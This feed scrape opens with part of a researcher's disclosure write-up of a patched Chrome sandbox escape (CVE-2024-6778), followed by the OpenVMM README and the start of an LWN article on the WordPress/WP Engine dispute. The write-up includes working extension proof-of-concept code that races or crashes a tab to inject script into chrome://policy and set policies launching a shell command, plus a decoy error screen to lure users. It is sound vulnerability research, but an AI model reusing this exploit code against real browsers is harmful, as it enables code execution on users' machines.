<span>  </span><span>"devtools_page"</span><span>:</span><span> </span><span>"devtools.html"</span><span>,</span>
<span>  </span><span>...</span>
<span>}</span>
</code></pre></div>

<p>Essentially, what this does is it specifies that whenever the user opens devtools, the devtools page loads <code>devtools.html</code> as an iframe. Within that iframe, the extension can use all of the <code>chrome.devtools</code> APIs. You can refer to the <a href="https://developer.chrome.com/docs/extensions/how-to/devtools/extend-devtools">API documentation</a> for the specifics. </p>
<p>While researching the <code>chrome.devtools.inspectedWindow</code> APIs, I noticed a <a href="https://issues.chromium.org/issues/40053357">prior bug report by David Erceg</a>, which involved a bug with <code>chrome.devtools.inspectedWindow.eval()</code>. He managed to get code execution on a WebUI by opening devtools on a normal page, then running <code>chrome.devtools.inspectedWindow.eval()</code> with a script that crashed the page. Then, this crashed tab could be navigated to a WebUI page, where the eval request would be re-run, thus gaining code execution there.</p>
<p>Notably, the <code>chrome.devtools</code> APIs are supposed to protect against this sort of privilege execution by simply disabling their usage after the inspected page has been navigated to a WebUI. As David Erceg demonstrated in his bug report, the key to bypassing this is to send the request for the eval before Chrome decides to disable the devtools API, and to make sure the request arrives at the WebUI page. </p>
<p>After reading that report, I wondered if something similar was possible with <a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow"><code>chrome.devtools.inspectedWindow.reload()</code></a>. This function is also able to run JS on the inspected page, as long as the <code>injectedScript</code> is passed into it.</p>
<p>The first sign that it was exploitable appeared when I tried calling <code>inspectedWindow.reload()</code> when the inspected page was an <code>about:blank</code> page which belonged to a WebUI. <code>about:blank</code> pages are unique in this regard since even though the URL is not special, they inherit the permissions and origin from the page that opened them. Because an <code>about:blank</code> page opened from a WebUI is privileged, you would expect that trying to evaluate JS on that page would be blocked.</p>
<p><img alt="A demo of using inspectedWindow.reload() on an about:blank page." src="https://ading.dev/blog/assets/chrome_sandbox_escape/inspectedwindow_on_blank.png"></p>
<p>Surprisingly, this actually worked. Notice that the title of the alert has the page's origin in it, which is <code>chrome://settings</code>, so the page is in fact privileged. But wait, isn't the devtools API supposed to prevent this exact thing by disabling the API entirely? Well, it doesn't consider the edge case of <code>about:blank</code> pages. Here's the code that handles disabling the API:</p>
<div><pre><span></span><code><span>private</span><span> inspectedURLChanged</span><span>(</span><span>event</span><span>:</span><span> </span><span>Common.EventTarget.EventTargetEvent</span><span>&lt;</span><span>SDK</span><span>.</span><span>Target</span><span>.</span><span>Target</span><span>&gt;):</span><span> </span><span>void</span><span> </span><span>{</span>
<span>  </span><span>if</span><span> </span><span>(!</span><span>ExtensionServer</span><span>.</span><span>canInspectURL</span><span>(</span><span>event</span><span>.</span><span>data</span><span>.</span><span>inspectedURL</span><span>()))</span><span> </span><span>{</span>
<span>    </span><span>this</span><span>.</span><span>disableExtensions</span><span>();</span>
<span>    </span><span>return</span><span>;</span>
<span>  </span><span>}</span>
<span>  </span><span>...</span>
<span>}</span>
</code></pre></div>

<p>Importantly, it only takes the URL into consideration here, not the page's origin. As I demonstrated earlier, these can be two distinct things. Even if the URL is benign, the origin may not be.</p>
<p>Abusing <code>about:blank</code> is nice and all but it's not very useful in the context of making an exploit chain. The page I want to get code execution on, <code>chrome://policy</code>, never opens any <code>about:blank</code> popups, so that's already a dead end. However, I noticed the fact that even though <code>inspectedWindow.eval()</code> failed, <code>inspectedWindow.reload()</code> still ran successfully and executed the JS on <code>chrome://settings</code>. This suggested that <code>inspectedWindow.eval()</code> has its own checks to see if the origin of the inspected page is allowed, while <code>inspectedWindow.reload()</code> has no checks of its own. </p>
<p>Then I wondered if I could just spam the <code>inspectedWindow.reload()</code> calls, so that if at least one of those requests landed on the WebUI page, I would get code execution. </p>
<div><pre><span></span><code><span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>    //check the origin, this script won't do anything on a non chrome page</span>
<span>    if (!origin.startsWith("chrome://")) return;</span>
<span>    alert("hello from chrome.devtools.inspectedWindow.reload");</span>
<span>    `</span>
<span>  </span><span>});</span>
<span>}</span>

<span>setInterval</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
<span>  </span><span>for</span><span> </span><span>(</span><span>let</span><span> i</span><span>=</span><span>0</span><span>;</span><span> i</span><span>&lt;</span><span>5</span><span>;</span><span> i</span><span>++)</span><span> </span><span>{</span>
<span>    inject_script</span><span>();</span><span> </span>
<span>  </span><span>}</span>
<span>},</span><span> </span><span>0</span><span>);</span><span>  </span>

<span>chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://policy"</span><span>});</span>
</code></pre></div>

<p><img alt="A screenshot of an alert() on chrome://policy." src="https://ading.dev/blog/assets/chrome_sandbox_escape/inspectedwindow_race.png"></p>
<p>And that's the final piece of the exploit chain working. This race condition relies on the fact that the inspected page and the devtools page are different processes. When the navigation to the WebUI occurs in the inspected page, there is a small window of time before the devtools page realizes and disables the API. If <code>inspectedWindow.reload()</code> is called within this interval of time, the reload request will end up on the WebUI page.</p>
<h2>Putting it All Together</h2>
<p>Now that I had all of the steps of the exploit working, I began putting together the proof of concept code. To recap, this POC has to do the following:</p>
<ol>
<li>Use the race condition in <code>chrome.devtools.inspectedWindow.reload()</code> to execute a JS payload on <code>chrome://policy</code></li>
<li>That payload calls <code>sendWithPromise("setLocalTestPolicies", policy)</code> to set custom user policies.</li>
<li>The <code>BrowserSwitcherEnabled</code>, <code>BrowserSwitcherUrlList</code>, <code>AlternativeBrowserPath</code>, and <code>AlternativeBrowserParameters</code> are set, specifying <code>/bin/bash</code> as the "alternate browser."</li>
<li>The browser switcher is triggered by a simple <code>window.open()</code> call, which executes a shell command.</li>
</ol>
<p>The final proof of concept exploit looked like this:</p>
<div><pre><span></span><code><span>let</span><span> executable</span><span>,</span><span> flags</span><span>;</span>
<span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Windows NT"</span><span>))</span><span> </span><span>{</span>
<span>  executable </span><span>=</span><span> </span><span>"C:\\Windows\\System32\\cmd.exe"</span><span>;</span>
<span>  flags </span><span>=</span><span> </span><span>[</span><span>"/C"</span><span>,</span><span> </span><span>"calc.exe &amp; rem ${url}"</span><span>];</span>
<span>}</span>
<span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Linux"</span><span>))</span><span> </span><span>{</span>
<span>  executable </span><span>=</span><span> </span><span>"/bin/bash"</span><span>;</span>
<span>  flags </span><span>=</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc # ${url}"</span><span>];</span>
<span>}</span>
<span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Mac OS"</span><span>))</span><span> </span><span>{</span>
<span>  executable </span><span>=</span><span> </span><span>"/bin/bash"</span><span>;</span>
<span>  flags </span><span>=</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"open -na Calculator # ${url}"</span><span>];</span>
<span>}</span>

<span>//function which injects the content script into the inspected page</span>
<span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>    (async () =&gt; {</span>
<span>      //check the origin, this script won't do anything on a non chrome page</span>
<span>      console.log(origin);</span>
<span>      if (!origin.startsWith("chrome://")) return;</span>

<span>      //import cr.js since we need sendWithPromise</span>
<span>      let cr = await import('chrome://resources/js/cr.js');</span>

<span>      //here are the policies we are going to set</span>
<span>      let policy = JSON.stringify([</span>
<span>        { //enable the browser switcher feature</span>
<span>          name: "BrowserSwitcherEnabled",</span>
<span>          value: true,</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }, </span>
<span>        { //set the browser switcher to trigger on example.com</span>
<span>          name: "BrowserSwitcherUrlList",</span>
<span>          value: ["example.com"],</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }, </span>
<span>        { //set the executable path to launch</span>
<span>          name: "AlternativeBrowserPath",</span>
<span>          value: </span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>executable</span><span>)}</span><span>,</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }, </span>
<span>        { //set the arguments for the executable</span>
<span>          name: "AlternativeBrowserParameters",</span>
<span>          value: </span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>flags</span><span>)}</span><span>,</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }</span>
<span>      ]);</span>

<span>      //set the policies listed above</span>
<span>      await cr.sendWithPromise("setLocalTestPolicies", policy, "");</span>

<span>      setTimeout(() =&gt; {</span>
<span>        //navigate to example.com, which will trigger the browser switcher</span>
<span>        location.href = "https://example.com";</span>

<span>        //open a new page so that there is still a tab remaining after this</span>
<span>        open("about:blank");  </span>
<span>      }, 100);</span>
<span>    })()`</span>
<span>  </span><span>});</span>
<span>}</span>

<span>//interval to keep trying to inject the content script</span>
<span>//there's a tiny window of time in which the content script will be</span>
<span>//injected into a protected page, so this needs to run frequently</span>
<span>function</span><span> start_interval</span><span>()</span><span> </span><span>{</span>
<span>  setInterval</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
<span>    </span><span>//loop to increase our odds</span>
<span>    </span><span>for</span><span> </span><span>(</span><span>let</span><span> i</span><span>=</span><span>0</span><span>;</span><span> i</span><span>&lt;</span><span>3</span><span>;</span><span> i</span><span>++)</span><span> </span><span>{</span>
<span>      inject_script</span><span>();</span><span> </span>
<span>    </span><span>}</span>
<span>  </span><span>},</span><span> </span><span>0</span><span>);</span><span>  </span>
<span>}</span>

<span>async</span><span> </span><span>function</span><span> main</span><span>()</span><span> </span><span>{</span>
<span>  </span><span>//start the interval to inject the content script</span>
<span>  start_interval</span><span>();</span>

<span>  </span><span>//navigate the inspected page to chrome://policy</span>
<span>  </span><span>let</span><span> tab </span><span>=</span><span> </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>get</span><span>(</span><span>chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>);</span>
<span>  </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://policy"</span><span>});</span>

<span>  </span><span>//if this times out we need to retry or abort</span>
<span>  </span><span>await</span><span> </span><span>new</span><span> </span><span>Promise</span><span>((</span><span>resolve</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>setTimeout</span><span>(</span><span>resolve</span><span>,</span><span> </span><span>1000</span><span>)});</span>
<span>  </span><span>let</span><span> new_tab </span><span>=</span><span> </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>get</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>);</span>

<span>  </span><span>//if we're on the policy page, the content script didn't get injected</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>new_tab</span><span>.</span><span>url</span><span>.</span><span>startsWith</span><span>(</span><span>"chrome://policy"</span><span>))</span><span> </span><span>{</span>
<span>    </span><span>//navigate back to the original page</span>
<span>    </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> tab</span><span>.</span><span>url</span><span>});</span>

<span>    </span><span>//discarding and reloading the tab will close devtools</span>
<span>    setTimeout</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
<span>      chrome</span><span>.</span><span>tabs</span><span>.</span><span>discard</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>);</span>
<span>    </span><span>},</span><span> </span><span>100</span><span>)</span>
<span>  </span><span>}</span>

<span>  </span><span>//we're still on the original page, so reload the extension frame to retry</span>
<span>  </span><span>else</span><span> </span><span>{</span>
<span>    location</span><span>.</span><span>reload</span><span>();</span>
<span>  </span><span>}</span>
<span>}</span>

<span>main</span><span>();</span>
</code></pre></div>

<p>And with that, I was ready to write the bug report. I finalized the script, wrote an explanation of the bug, tested it on multiple operating systems, and sent it in to Google. </p>
<p>At this point however, there was still a glaring problem: The race condition with <code>.inspectedWindow.reload()</code> was not very reliable. I managed to tweak it so that it worked about 70% of the time, but that still wasn't enough. While the fact that it worked at all definitely made it a serious vulnerability regardless, the unreliability would have reduced the severity by quite a bit. So then I got to work trying to find a better way.</p>
<h2>A Familiar Approach</h2>
<p>Remember how I mentioned that in David Erceg's bug report, he utilized the fact that debugger requests persist after the tab crashes? I wondered if this exact method worked for <code>inspectedWindow.reload()</code> too, so I tested it. I also messed with the <code>debugger</code> statement, and it appeared that triggering the debugger twice in a row caused the tab to crash.</p>
<p>So I got to work writing a new POC:</p>
<div><pre><span></span><code><span>let</span><span> tab_id </span><span>=</span><span> chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>;</span>

<span>//function which injects the content script into the inspected page</span>
<span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>    //check the origin, so that the debugger is triggered instead if we are not on a chrome page</span>
<span>    if (!origin.startsWith("chrome://")) {</span>
<span>      debugger;</span>
<span>      return;</span>
<span>    }</span>

<span>    alert("hello from chrome.devtools.inspectedWindow.reload");`</span>
<span>  </span><span>});</span>
<span>}</span>

<span>function</span><span> sleep</span><span>(</span><span>ms</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>return</span><span> </span><span>new</span><span> </span><span>Promise</span><span>((</span><span>resolve</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>setTimeout</span><span>(</span><span>resolve</span><span>,</span><span> ms</span><span>)})</span>
<span>}</span>

<span>async</span><span> </span><span>function</span><span> main</span><span>()</span><span> </span><span>{</span>
<span>  </span><span>//we have to reset the tab's origin here so that we don't crash our own extension process</span>
<span>  </span><span>//this navigates to example.org which changes the tab's origin</span>
<span>  </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab_id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"https://example.org/"</span><span>});</span>
<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
<span>  </span><span>//navigate to about:blank from within the example.org page which keeps the same origin</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>      location.href = "about:blank";</span>
<span>    `</span><span> </span>
<span>  </span><span>})</span>
<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>

<span>  inject_script</span><span>();</span><span> </span><span>//pause the current tab</span>
<span>  inject_script</span><span>();</span><span> </span><span>//calling this again crashes the tab and queues up our javascript</span>
<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
<span>  chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab_id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://settings"</span><span>});</span>
<span>}</span>

<span>main</span><span>();</span>
</code></pre></div>

<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/devtools_api_vuln.mp4" type="video/mp4">
  <p>Video info: A demonstration of the method that involves crashing the inspected page.</p>
</video>

<p>And it works! This nice part about this approach is that it eliminates the need for a race condition and makes the exploit 100% reliable. Then, I uploaded the new POC, with all of the <code>chrome://policy</code> stuff, to a comment on the bug report thread. </p>
<p>But why would this exact oversight still exist even though it should have been patched 4 years ago? We can figure out why by looking at how that previous bug was patched. Google's fix was to <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2587606">clear all the pending debugger requests</a> after the tab crashes, which seems like a sensible approach:</p>
<div><pre><span></span><code><span>void</span><span> </span><span>DevToolsSession::ClearPendingMessages</span><span>(</span><span>bool</span><span> did_crash</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>for</span><span> </span><span>(</span><span>auto</span><span> it </span><span>=</span><span> pending_messages_</span><span>.</span><span>begin</span><span>();</span><span> it </span><span>!=</span><span> pending_messages_</span><span>.</span><span>end</span><span>();)</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> PendingMessage</span><span>&amp;</span><span> message </span><span>=</span><span> </span><span>*</span><span>it</span><span>;</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>SpanEquals</span><span>(</span><span>crdtp</span><span>::</span><span>SpanFrom</span><span>(</span><span>"Page.reload"</span><span>),</span>
<span>                   crdtp</span><span>::</span><span>SpanFrom</span><span>(</span><span>message</span><span>.</span><span>method</span><span>)))</span><span> </span><span>{</span>
<span>      </span><span>++</span><span>it</span><span>;</span>
<span>      </span><span>continue</span><span>;</span>
<span>    </span><span>}</span>
<span>    </span><span>// Send error to the client and remove the message from pending.</span>
<span>    std</span><span>::</span><span>string error_message </span><span>=</span>
<span>        did_crash </span><span>?</span><span> kTargetCrashedMessage </span><span>:</span><span> kTargetClosedMessage</span><span>;</span>
<span>    SendProtocolResponse</span><span>(</span>
<span>        message</span><span>.</span><span>call_id</span><span>,</span>
<span>        crdtp</span><span>::</span><span>CreateErrorResponse</span><span>(</span>
<span>            message</span><span>.</span><span>call_id</span><span>,</span>
<span>            crdtp</span><span>::</span><span>DispatchResponse</span><span>::</span><span>ServerError</span><span>(</span><span>error_message</span><span>)));</span>
<span>    waiting_for_response_</span><span>.</span><span>erase</span><span>(</span><span>message</span><span>.</span><span>call_id</span><span>);</span>
<span>    it </span><span>=</span><span> pending_messages_</span><span>.</span><span>erase</span><span>(</span><span>it</span><span>);</span>
<span>  </span><span>}</span>
<span>}</span>
</code></pre></div>

<p>You may notice that it seems to contain an exception for the <code>Page.reload</code> requests so that they are not cleared. Internally, the <code>inspectedWindow.reload()</code> API sends a <code>Page.reload</code> request, so as a result the <code>inspectedWindow.reload()</code> API calls are exempted from this patch. Google really patched this bug, then added an exception to it which made the bug possible again. I guess they didn't realize that <code>Page.reload</code> could also run scripts.</p>
<p>Another mystery is why the page crashes when the <code>debugger</code> statement is run twice. I'm still not completely sure about this one, but I think I narrowed it down to a function within Chromium's renderer code. It's specifically happens when Chromium <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=1345-1346;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a">checks the navigation state</a>, and when it encounters an unexpected state, it crashes. This state gets messed up when <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=5622;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a?q=navigation_commit_state_&amp;ss=chromium%2Fchromium%2Fsrc">RenderFrameImpl::SynchronouslyCommitAboutBlankForBug778318</a> is called (yet another side effect of treating <code>about:blank</code> specially). Of course, any kind of crash works, such as with <code>[...new Array(2**31)]</code>, which causes the tab to run out of memory. However, the <code>debugger</code> crash is much faster to trigger so that's what I used in my final POC.</p>
<p>Anyways, here's what the exploit looks like in action:</p>
<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/sandbox_escape_final.mp4" type="video/mp4">
  <p>Video info: A demonstration of the final POC.</p>
</video>

<p>By the way, you might have noticed the "extension install error" screen that is shown. That's just to trick the user into opening devtools, which triggers the chain leading to the sandbox escape.</p>
<h2>Google's Response</h2>
<p>After I reported the vulnerability, Google quickly confirmed it and classified it as P1/S1, which means high priority and high severity. Over the next few weeks, the following fixes were implemented:</p>
<ul>
<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5542082">Adding a <code>loaderId</code> argument to the <code>Page.reload</code> command</a> and <a href="https://chromium-review.googlesource.com/c/chromium/src/+/5625857">checking the <code>loaderID</code> on the renderer side</a>  - This ensures that the command is only valid for a single origin and won't work if the command reaches a privileged page unintentionally.</li>
<li><a href="https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/5546062">Checking for the URL in the <code>inspectedWindow.reload()</code> function</a> - Now, this function isn't dependent on only the extension API revoking access.</li>
<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5679162">Checking if the test policies are enabled in the WebUI handler</a> - By adding a working check in the handler function, this prevents the test policies from being set entirely.</li>
</ul>
<p>Eventually, the vulnerability involving the race condition was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5836">CVE-2024-5836</a>, with a CVSS severity score of 8.8 (High). The vulnerability involving crashing the inspected page was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6778">CVE-2024-6778</a>, also with a severity score of 8.8.</p>
<p>Once everything was fixed and merged into the various release branches, the VRP panel reviewed the bug report and determined the reward. <strong>I received with $20,000 for finding this vulnerability!</strong></p>
<p><img alt="A screenshot of the message which announced the reward amount" src="https://ading.dev/blog/assets/chrome_sandbox_escape/reward_annoucement.png"></p>
<p><img alt="A screenshot of the message which gave the rationale for the reward" src="https://ading.dev/blog/assets/chrome_sandbox_escape/reward_rationale.png"></p>
<h2>Timeline</h2>
<ul>
<li>April 16 - I discovered the test policies bug</li>
<li>April 29 - I found the <code>inspectedWindow.reload()</code> bug involving the race condition</li>
<li>May 1 - I sent the bug report to Google</li>
<li>May 4 - Google classified it as P1/S1 </li>
<li>May 5 - I found the bug involving crashing the inspected page, and updated my report </li>
<li>May 6 - Google asked me to file separate bug reports for every part of the chain</li>
<li>July 8 - The bug report is marked as fixed</li>
<li>July 13 - The report is sent to the Chrome VRP panel to determine a reward</li>
<li>July 17 - The VRP panel decided the reward amount to be $20,000</li>
<li>October 15 - The entire bug report became public</li>
</ul>
<h2>Conclusion</h2>
<p>I guess the main takeaway from all of this is that if you look in the right places, the simplest mistakes can be compound upon each other to result in a vulnerability with surprisingly high severity. You also can't trust that very old code will remain safe after many years, considering that the <code>inspectedWindow.reload</code> bug actually works as far back as Chrome v45. Additionally, it isn't a good idea to ship completely undocumented, incomplete, and insecure features to everyone, as was the case with the policy test page bug. Finally, when fixing a vulnerability, you should check to see if similar bugs are possible and try to fix those as well.</p>
<p>You may find the original bug report here: <a href="https://issues.chromium.org/issues/40053357">crbug.com/40053357</a></p>
<p>I've also put the POCs for each part of the vulnerability in <a href="https://github.com/ading2210/CVE-2024-6778-POC">a Github repo</a>.</p>


        
          <p><a href="https://ading.dev/blog/">&lt;- Back</a></p>
        
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenVMM – A New VMM for Windows and Linux, Written in Rust (143 pts)]]></title>
            <link>https://github.com/microsoft/openvmm</link>
            <guid>41866742</guid>
            <pubDate>Thu, 17 Oct 2024 05:42:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/microsoft/openvmm">https://github.com/microsoft/openvmm</a>, See on <a href="https://news.ycombinator.com/item?id=41866742">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">OpenVMM</h2><a id="user-content-openvmm" aria-label="Permalink: OpenVMM" href="#openvmm"></a></p>
<p dir="auto"><a href="https://github.com/microsoft/openvmm/actions/workflows/openvmm-ci.yaml"><img src="https://github.com/microsoft/openvmm/actions/workflows/openvmm-ci.yaml/badge.svg?branch=main" alt="Build Status"></a></p>
<p dir="auto">OpenVMM is a new VMM for Windows and Linux, written in Rust.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Developer Guide</h2><a id="user-content-developer-guide" aria-label="Permalink: Developer Guide" href="#developer-guide"></a></p>
<p dir="auto">See the <a href="https://aka.ms/openvmmguide" rel="nofollow">developer guide</a> and in particular the getting started section.</p>
<p dir="auto">The guide is published out of this repo via <a href="https://github.com/microsoft/openvmm/blob/main/Guide/src/SUMMARY.md">Markdown files</a>.
Please keep them up-to-date.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit <a href="https://cla.opensource.microsoft.com/" rel="nofollow">https://cla.opensource.microsoft.com</a>.</p>
<p dir="auto">When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.</p>
<p dir="auto">This project has adopted the <a href="https://opensource.microsoft.com/codeofconduct/" rel="nofollow">Microsoft Open Source Code of Conduct</a>.
For more information see the <a href="https://opensource.microsoft.com/codeofconduct/faq/" rel="nofollow">Code of Conduct FAQ</a> or
contact <a href="mailto:opencode@microsoft.com">opencode@microsoft.com</a> with any additional questions or comments.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Trademarks</h2><a id="user-content-trademarks" aria-label="Permalink: Trademarks" href="#trademarks"></a></p>
<p dir="auto">This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
<a href="https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general" rel="nofollow">Microsoft's Trademark &amp; Brand Guidelines</a>.
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[WordPress retaliation impacts community (223 pts)]]></title>
            <link>https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/</link>
            <guid>41866328</guid>
            <pubDate>Thu, 17 Oct 2024 04:06:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/">https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/</a>, See on <a href="https://news.ycombinator.com/item?id=41866328">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<blockquote>
<div>
<h3>Welcome to LWN.net</h3>
<p>
The following subscription-only content has been made available to you 
by an LWN subscriber.  Thousands of subscribers depend on LWN for the 
best news from the Linux and free software communities.  If you enjoy this 
article, please consider <a href="https://lwn.net/subscribe/">subscribing to LWN</a>.  Thank you
for visiting LWN.net!
</p></div>
</blockquote>

<p>It is too early to say what the outcome will be in the <a href="https://lwn.net/Articles/991906/">ongoing fight</a> between <a href="https://automattic.com/">Automattic</a> and <a href="https://wpengine.com/">WP&nbsp;Engine</a>, but the <a href="https://wordpress.org/">WordPress</a> community at large is already the
loser. Automattic founder and CEO Matt Mullenweg has been using
his control of the project, and the WordPress.org infrastructure, to
punish WP&nbsp;Engine and remove some dissenting contributors from discussion
channels. Most recently, Mullenweg has instituted a hostile fork of a
WP&nbsp;Engine plugin and the forked plugin is replacing the original
via WordPress updates.</p>

<p>In the beginning of the Automattic and WP&nbsp;Engine spat, many
people hoped that the companies would ratchet down the
hostilities—or at least leave it to lawyers to sort out while
leaving the larger community out of it. Those hopes have gone unrealized.</p>

<p>WP&nbsp;Engine did try to opt for the legal-only route. The day
after the "<a href="https://wordpress.org/news/2024/09/wp-engine-reprieve/">reprieve</a>"
on the <a href="https://wordpress.org/news/2024/09/wp-engine-banned/">WordPress.org
ban</a> ended, October&nbsp;2, WP&nbsp;Engine filed a <a href="https://wpengine.com/wp-content/uploads/2024/10/Complaint-WP-Engine-v-Automattic-et-al.pdf">62‑page
complaint</a> against Automattic and Mullenweg personally, and asked
for a jury trial. The suit's claims include contractual
interference, computer fraud (for blocking its access to WordPress.org),
attempted extortion, libel, and slander. In addition, the suit asks for
declaratory judgment that WP&nbsp;Engine is not infringing on or
diluting the WordPress, WooCommerce, and other trademarks that
Automattic named in its <a href="https://automattic.com/2024/wp-engine-cease-and-desist.pdf">cease‑and‑desist letter</a>.</p>

<p>That is, of course, a move that was unlikely to rebuild any burned
bridges between Automattic and WP&nbsp;Engine. It was predictable that
the WordPress.org ban would remain in place, that
Automattic would respond to the suit, and perhaps countersue
WP&nbsp;Engine. However, to date, there has been no indication of a
countersuit or response to WP&nbsp;Engine's lawsuit. Instead,
Mullenweg is using other means to cause problems for
WP&nbsp;Engine—and those tactics have spilled over to the wider
WordPress community in troubling ways.</p>

<h4>The checkbox</h4>

<p>Participating in the development of WordPress is not realistically
possible without logging into the site. Using WordPress.org is
mandatory for those who would like to <a href="https://wordpress.org/plugins/developers/">contribute and update
plugins</a>, <a href="https://core.trac.wordpress.org/">access the
WordPress Trac (bug tracker) instance</a>, and more. On October&nbsp;9, <a href="https://wptavern.com/wordpress-org-login-gets-mandatory-affiliation-checkbox-following-wp-engine-dispute">a
new checkbox was added</a> to the account login form on WordPress.org
which reads "<q>I am not affiliated with WP&nbsp;Engine in any way,
financially or otherwise.</q>" If the box is left unchecked, users
will get a prompt to check the box if they wish to proceed.</p>

<p>Naturally, many contributors had questions about this new
checkbox, since its wording is ambiguous and any possible consequences
are murky. It seems clear it would apply to those employed by
